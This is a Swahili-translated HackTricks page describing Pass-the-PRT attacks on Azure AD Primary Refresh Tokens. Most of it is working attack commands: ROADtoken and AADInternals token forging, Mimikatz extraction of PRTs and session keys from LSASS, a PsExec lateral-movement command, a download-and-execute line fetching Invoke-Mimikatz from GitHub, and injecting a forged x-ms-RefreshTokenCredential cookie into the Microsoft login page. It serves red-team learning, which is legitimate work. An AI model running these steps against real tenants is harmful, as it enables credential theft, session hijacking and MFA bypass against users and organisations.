# Az - Pita PRT

<details>

<summary><strong>Jifunze kuhusu udukuzi wa AWS kutoka sifuri hadi shujaa na</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (Mtaalam wa Timu Nyekundu ya AWS ya HackTricks)</strong></a><strong>!</strong></summary>

Njia nyingine za kusaidia HackTricks:

* Ikiwa unataka kuona **kampuni yako ikitangazwa kwenye HackTricks** au **kupakua HackTricks kwa PDF** Angalia [**MIPANGO YA USAJILI**](https://github.com/sponsors/carlospolop)!
* Pata [**bidhaa rasmi za PEASS & HackTricks**](https://peass.creator-spring.com)
* Gundua [**Familia ya PEASS**](https://opensea.io/collection/the-peass-family), mkusanyiko wetu wa [**NFTs**](https://opensea.io/collection/the-peass-family) ya kipekee
* **Jiunge na** üí¨ [**Kikundi cha Discord**](https://discord.gg/hRep4RUj7f) au kikundi cha [**telegram**](https://t.me/peass) au **tufuate** kwenye **Twitter** üê¶ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Shiriki mbinu zako za udukuzi kwa kuwasilisha PRs kwa** [**HackTricks**](https://github.com/carlospolop/hacktricks) na [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) repos za github.

</details>

## Ni nini PRT

{% content-ref url="az-primary-refresh-token-prt.md" %}
[az-primary-refresh-token-prt.md](az-primary-refresh-token-prt.md)
{% endcontent-ref %}

### Angalia ikiwa una PRT
```
Dsregcmd.exe /status
```
Katika sehemu ya Hali ya SSO, unapaswa kuona **`AzureAdPrt`** imewekwa kuwa **NDIYO**.

<figure><img src="../../../.gitbook/assets/image (140).png" alt=""><figcaption></figcaption></figure>

Katika matokeo hayo hiyo unaweza pia kuona kama **kifaa kimejiunga na Azure** (katika uga wa `AzureAdJoined`):

<figure><img src="../../../.gitbook/assets/image (135).png" alt=""><figcaption></figcaption></figure>

## Kuki ya PRT

Kuki ya PRT kimsingi inaitwa **`x-ms-RefreshTokenCredential`** na ni JSON Web Token (JWT). JWT ina **sehemu 3**, **kichwa**, **mzigo** na **sahihi**, zilizogawanywa na `.` na zote zimekodishwa kwa msingi wa url salama. Kuki ya kawaida ya PRT ina kichwa na mwili ufuatao:
```json
{
"alg": "HS256",
"ctx": "oYKjPJyCZN92Vtigt/f8YlVYCLoMu383"
}
{
"refresh_token": "AQABAAAAAAAGV_bv21oQQ4ROqh0_1-tAZ18nQkT-eD6Hqt7sf5QY0iWPSssZOto]<cut>VhcDew7XCHAVmCutIod8bae4YFj8o2OOEl6JX-HIC9ofOG-1IOyJegQBPce1WS-ckcO1gIOpKy-m-JY8VN8xY93kmj8GBKiT8IAA",
"is_primary": "true",
"request_nonce": "AQABAAAAAAAGV_bv21oQQ4ROqh0_1-tAPrlbf_TrEVJRMW2Cr7cJvYKDh2XsByis2eCF9iBHNqJJVzYR_boX8VfBpZpeIV078IE4QY0pIBtCcr90eyah5yAA"
}
```
PRT halisi **Primary Refresh Token (PRT)** iko ndani ya **`refresh_token`**, ambayo imefichwa kwa kutumia ufunguo chini ya udhibiti wa Azure AD, ikifanya maudhui yake kuwa ya undecryptable kwetu. Uga wa **`is_primary`** unaashiria kufungwa kwa primary refresh token ndani ya token hili. Ili kuhakikisha kuwa kuki inabaki imefungwa kwenye kikao cha kuingia kilichokusudiwa, `request_nonce` inatumwa kutoka ukurasa wa `logon.microsoftonline.com`.

### Mzunguko wa Kuki ya PRT ukitumia TPM

Mchakato wa **LSASS** utatuma kwa TPM **KDF context**, na TPM itatumia **session key** (ilipatikana wakati kifaa kilisajiliwa katika AzureAD na kuhifadhiwa kwenye TPM) na muktadha uliopita kwa **kudhibiti** ufunguo, na ufunguo huu **uliodhibitiwa** hutumiwa kusaini kuki ya PRT (JWT).

**KDF context** ni nonce kutoka AzureAD na PRT inayounda **JWT** iliyochanganywa na **muktadha** (baiti za nasibu).

Hivyo, hata kama PRT haiwezi kuchimbuliwa kwa sababu iko ndani ya TPM, niwezekanavyo kutumia LSASS kwa **kuomba ufunguo uliodhibitiwa kutoka kwa muktadha mpya na kutumia ufunguo uliotengenezwa kusaini Cookies**.

<figure><img src="../../../.gitbook/assets/image (31).png" alt=""><figcaption></figcaption></figure>

## Mifano ya Matumizi Mabaya ya PRT

Kama **mtumiaji wa kawaida** niwezekanavyo **kuomba matumizi ya PRT** kwa kuuliza LSASS kwa data ya SSO.\
Hii inaweza kufanywa kama **programu za asili** ambazo huomba vitufe kutoka kwa **Meneja wa Akaunti ya Wavuti** (mshughulikiaji wa vitufe). WAM hupitisha ombi kwa **LSASS**, ambayo inauliza vitufe kwa kutumia uthibitisho wa PRT uliosainiwa. Au inaweza kufanywa na **mifumo ya wavuti ya kivinjari** ambapo **kuki ya PRT** hutumiwa kama **kichwa** cha kuthibitisha maombi kwenye kurasa za kuingia za Azure AS.

Kama **SYSTEM** unaweza **kuiba PRT ikiwa haijalindwa** na TPM au **kutumia ufunguo wa PRT katika LSASS** kwa kutumia APIs za crypto.

## Mifano ya Mashambulizi ya Pass-the-PRT

### Shambulio - ROADtoken

Kwa habari zaidi kuhusu njia hii [**angalia chapisho hili**](https://dirkjanm.io/abusing-azure-ad-sso-with-the-primary-refresh-token/). ROADtoken itaendesha **`BrowserCore.exe`** kutoka kwenye saraka sahihi na kutumia hiyo kwa **kupata kuki ya PRT**. Kuki hii inaweza kisha kutumika na ROADtools kuthibitisha na **kupata kibonyezo cha kudumu**.

Ili kuzalisha kuki sahihi ya PRT jambo la kwanza unahitaji ni nonce.\
Unaweza kupata hii kwa:
```powershell
$TenantId = "19a03645-a17b-129e-a8eb-109ea7644bed"
$URL = "https://login.microsoftonline.com/$TenantId/oauth2/token"

$Params = @{
"URI"     = $URL
"Method"  = "POST"
}
$Body = @{
"grant_type" = "srv_challenge"
}
$Result = Invoke-RestMethod @Params -UseBasicParsing -Body $Body
$Result.Nonce
AwABAAAAAAACAOz_BAD0_8vU8dH9Bb0ciqF_haudN2OkDdyluIE2zHStmEQdUVbiSUaQi_EdsWfi1 9-EKrlyme4TaOHIBG24v-FBV96nHNMgAA
```
Au kutumia [**roadrecon**](https://github.com/dirkjanm/ROADtools):
```powershell
roadrecon auth prt-init
```
Kisha unaweza kutumia [**roadtoken**](https://github.com/dirkjanm/ROADtoken) kupata PRT mpya (endesha zana kutoka kwa mchakato wa mtumiaji kushambulia):
```powershell
.\ROADtoken.exe <nonce>
```
```plaintext
Chini ni mbinu ya kuvuka mipaka kwa wingu hadi kwenye eneo la ndani.
```
```powershell
Invoke-Command - Session $ps_sess -ScriptBlock{C:\Users\Public\PsExec64.exe - accepteula -s "cmd.exe" " /c C:\Users\Public\SessionExecCommand.exe UserToImpersonate C:\Users\Public\ROADToken.exe AwABAAAAAAACAOz_BAD0__kdshsy61GF75SGhs_[...] > C:\Users\Public\PRT.txt"}
```
{% endcode %}

Kisha unaweza kutumia **cookie iliyozalishwa** kuzalisha **vibali** vya **kuingia** kwa kutumia Azure AD **Graph** au Microsoft Graph:
```powershell
# Generate
roadrecon auth --prt-cookie <prt_cookie>

# Connect
Connect-AzureAD --AadAccessToken <token> --AccountId <acc_ind>
```
### Shambulizi - Kutumia roadrecon

### Shambulizi - Kutumia AADInternals na PRT iliyovuja

`Get-AADIntUserPRTToken` **inapata tokeni ya PRT ya mtumiaji** kutoka kwa kompyuta iliyounganishwa na Azure AD au Hybrid. Inatumia `BrowserCore.exe` kupata tokeni ya PRT.
```powershell
# Get the PRToken
$prtToken = Get-AADIntUserPRTToken

# Get an access token for AAD Graph API and save to cache
Get-AADIntAccessTokenForAADGraph -PRTToken $prtToken
```
Au ikiwa una thamani kutoka kwa Mimikatz unaweza pia kutumia AADInternals kuzalisha token:
```powershell
# Mimikat "PRT" value
$MimikatzPRT="MC5BWU..."

# Add padding
while($MimikatzPrt.Length % 4) {$MimikatzPrt += "="}

# Decode
$PRT=[text.encoding]::UTF8.GetString([convert]::FromBase64String($MimikatzPRT))

# Mimikatz "Clear key" value
$MimikatzClearKey="37c5ecdfeab49139288d8e7b0732a5c43fac53d3d36ca5629babf4ba5f1562f0"

# Convert to Byte array and B64 encode
$SKey = [convert]::ToBase64String( [byte[]] ($MimikatzClearKey -replace '..', '0x$&,' -split ',' -ne ''))

# Generate PRTToken with Nonce
$prtToken = New-AADIntUserPRTToken -RefreshToken $PRT -SessionKey $SKey -GetNonce
$prtToken
## You can already use this token ac cookie in the browser

# Get access token from prtToken
$AT = Get-AADIntAccessTokenForAzureCoreManagement -PRTToken $prtToken

# Verify access and connect with Az. You can see account id in mimikatz prt output
Connect-AzAccount -AccessToken $AT -TenantID <tenant-id> -AccountId <acc-id>
```
Nenda kwenye [https://login.microsoftonline.com](https://login.microsoftonline.com), futa mikate yote kwa ajili ya login.microsoftonline.com na ingiza kikapu kipya.
```
Name: x-ms-RefreshTokenCredential
Value: [Paste your output from above]
Path: /
HttpOnly: Set to True (checked)
```
Kisha endelea [https://portal.azure.com](https://portal.azure.com)

{% hint style="danger" %}
Sehemu iliyobaki inapaswa kuwa ya msingi. Hakikisha unaweza kusasisha ukurasa na kuki isipotee, ikiwa itapotea, unaweza kuwa umefanya kosa na lazima upitie mchakato huo tena. Ikiwa haitapotea, basi utakuwa umefanikiwa.
{% endhint %}

### Shambulio - Mimikatz

#### Hatua

1. **PRT (Primary Refresh Token) inachimbuliwa kutoka LSASS** (Local Security Authority Subsystem Service) na kuhifadhiwa kwa matumizi yanayofuata.
2. **Funguo la Kikao huchimbuliwa kisha**. Kwa kuwa funguo hili kwanza hutolewa na kisha kufanyiwa upya kwa kifaa cha ndani, inahitaji kufunguliwa kwa kutumia kifunguo cha msingi cha DPAPI. Maelezo kamili kuhusu DPAPI (Data Protection API) yanaweza kupatikana katika rasilimali hizi: [HackTricks](https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation/dpapi-extracting-passwords) na kwa uelewa wa matumizi yake, tazama [Shambulio la Pita-kuki](az-pass-the-cookie.md).
3. Baada ya kufungua funguo la Kikao, **funguo uliochomwa na muktadha kwa ajili ya PRT unapatikana**. Hizi ni muhimu kwa **ujenzi wa kuki ya PRT**. Hasa, funguo uliochomwa hutumiwa kusaini JWT (JSON Web Token) ambayo inajumuisha kuki. Maelezo kamili ya mchakato huu yametolewa na Dirk-jan, yanapatikana [hapa](https://dirkjanm.io/digging-further-into-the-primary-refresh-token/).

{% hint style="danger" %}
Tafadhali kumbuka kwamba ikiwa PRT iko ndani ya TPM na sio ndani ya `lsass` **mimikatz haitaweza kuichimbua**.\
Hata hivyo, itakuwa inawezekana kupata funguo kutoka kwa funguo uliochomwa kutoka kwa muktadha kutoka kwa TPM na kutumia kusaini kuki (angalia chaguo 3).
{% endhint %}

Unaweza kupata **maelezo ya kina ya mchakato uliofanywa** kuchimba maelezo haya hapa: [**https://dirkjanm.io/digging-further-into-the-primary-refresh-token/**](https://dirkjanm.io/digging-further-into-the-primary-refresh-token/)

{% hint style="warning" %}
Hii haitafanya kazi hasa baada ya marekebisho ya Agosti 2021 ya kupata PRT za watumiaji wengine kwani mtumiaji pekee ndiye anaweza kupata PRT yake (msimamizi wa ndani hawezi kupata PRT za watumiaji wengine), lakini anaweza kupata yake.
{% endhint %}

Unaweza kutumia **mimikatz** kuchimba PRT:
```powershell
mimikatz.exe
Privilege::debug
Sekurlsa::cloudap

# Or in powershell
iex (New-Object Net.Webclient).downloadstring("https://raw.githubusercontent.com/samratashok/nishang/master/Gather/Invoke-Mimikatz.ps1")
Invoke-Mimikatz -Command '"privilege::debug" "sekurlsa::cloudap"'
```
(Images kutoka https://blog.netwrix.com/2023/05/13/pass-the-prt-overview)

<figure><img src="../../../.gitbook/assets/image (251).png" alt=""><figcaption></figcaption></figure>

**Copy** sehemu iliyoandikwa **Prt** na iihifadhi.\
Chukua pia ufunguo wa kikao (yaani **`KeyValue`** ya uga wa **`ProofOfPossesionKey`** ) ambao unaweza kuona umewekwa alama hapa chini. Hii imefichwa na tutahitaji kutumia DPAPI masterkeys yetu kuifichua.

<figure><img src="../../../.gitbook/assets/image (182).png" alt=""><figcaption></figcaption></figure>

{% hint style="info" %}
Ikiwa hauoni data yoyote ya PRT inaweza kuwa kwamba **huna PRTs** kwa sababu kifaa chako hakijajiunga na Azure AD au inaweza kuwa unatumia **toleo la zamani** la Windows 10.
{% endhint %}

Kufichua ufunguo wa kikao unahitaji **kuinua** mamlaka yako hadi **SYSTEM** ili uweze kufanya kazi chini ya muktadha wa kompyuta ili kutumia **DPAPI masterkey kuifichua**. Unaweza kutumia amri zifuatazo kufanya hivyo:
```
token::elevate
dpapi::cloudapkd /keyvalue:[PASTE ProofOfPosessionKey HERE] /unprotect
```
<figure><img src="../../../.gitbook/assets/image (183).png" alt=""><figcaption></figcaption></figure>

#### Chaguo 1 - Mimikatz Kamili

* Sasa unataka kunakili thamani zote za Muktadha:

<figure><img src="../../../.gitbook/assets/image (210).png" alt=""><figcaption></figcaption></figure>

* Na thamani ya ufunguo iliyopatikana:

<figure><img src="../../../.gitbook/assets/image (150).png" alt=""><figcaption></figcaption></figure>

* Hatimaye unaweza kutumia habari hii yote kuzalisha **vidakuzi vya PRT**:
```bash
Dpapi::cloudapkd /context:[CONTEXT] /derivedkey:[DerivedKey] /Prt:[PRT]
```
<figure><img src="../../../.gitbook/assets/image (282).png" alt=""><figcaption></figcaption></figure>

* Nenda kwenye [https://login.microsoftonline.com](https://login.microsoftonline.com), futa mikate yote kwa login.microsoftonline.com na ingiza mikate mpya.
```
Name: x-ms-RefreshTokenCredential
Value: [Paste your output from above]
Path: /
HttpOnly: Set to True (checked)
```
* Kisha endelea [https://portal.azure.com](https://portal.azure.com)

{% hint style="danger" %}
Sehemu nyingine inapaswa kuwa chaguo-msingi. Hakikisha unaweza kusasisha ukurasa na kuki isipotee, ikiwa inapotea, unaweza kuwa umefanya kosa na unahitaji kufuata mchakato huo tena. Ikiwa haitapotea, basi utakuwa umefanikiwa.
{% endhint %}

#### Chaguo 2 - roadrecon kutumia PRT

* Fanyia upya PRT kwanza, ambayo itahifadhiwa kwenye `roadtx.prt`:

{% code overflow="wrap" %}
```bash
roadtx prt -a renew --prt <PRT From mimikatz> --prt-sessionkey <clear key from mimikatz>
```
{% endcode %}

* Sasa tunaweza **kuomba vibali** kutumia kivinjari cha mwingiliano na `roadtx browserprtauth`. Ikiwa tutatumia amri ya `roadtx describe`, tunaona kibali cha ufikiaji kina sehemu ya MFA kwa sababu PRT niliyotumia katika kesi hii pia ilikuwa na sehemu ya MFA.
```bash
roadtx browserprtauth
roadtx describe < .roadtools_auth
```
<figure><img src="../../../.gitbook/assets/image (44).png" alt=""><figcaption></figcaption></figure>

#### Chaguo 3 - roadrecon kutumia funguo zilizopatikana

Ikiwa una muktadha na funguo zilizopatikana zilizochukuliwa na mimikatz, ni rahisi kutumia roadrecon kuzalisha kuki mpya iliyosainiwa kwa:

{% code overflow="wrap" %}
```bash
roadrecon auth --prt-cookie <cookie> --prt-context <context> --derives-key <derived key>
```
{% endcode %}

## Marejeo

* [https://stealthbits.com/blog/lateral-movement-to-the-cloud-pass-the-prt/](https://stealthbits.com/blog/lateral-movement-to-the-cloud-pass-the-prt/)
* [https://dirkjanm.io/abusing-azure-ad-sso-with-the-primary-refresh-token/](https://dirkjanm.io/abusing-azure-ad-sso-with-the-primary-refresh-token/)
* [https://www.youtube.com/watch?v=x609c-MUZ\_g](https://www.youtube.com/watch?v=x609c-MUZ\_g)

<details>

<summary><strong>Jifunze kuhusu kudukua AWS kutoka sifuri hadi shujaa na</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (Mtaalam wa Timu Nyekundu ya AWS ya HackTricks)</strong></a><strong>!</strong></summary>

Njia nyingine za kusaidia HackTricks:

* Ikiwa unataka kuona **kampuni yako ikitangazwa kwenye HackTricks** au **kupakua HackTricks kwa PDF** Angalia [**MIPANGO YA KUJIUNGA**](https://github.com/sponsors/carlospolop)!
* Pata [**bidhaa rasmi za PEASS & HackTricks**](https://peass.creator-spring.com)
* Gundua [**Familia ya PEASS**](https://opensea.io/collection/the-peass-family), mkusanyiko wetu wa [**NFTs**](https://opensea.io/collection/the-peass-family) ya kipekee
* **Jiunge na** üí¨ [**Kikundi cha Discord**](https://discord.gg/hRep4RUj7f) au kikundi cha [**telegram**](https://t.me/peass) au **tufuate** kwenye **Twitter** üê¶ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Shiriki mbinu zako za kudukua kwa kuwasilisha PRs kwa** [**HackTricks**](https://github.com/carlospolop/hacktricks) na [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) repos za github.

</details>
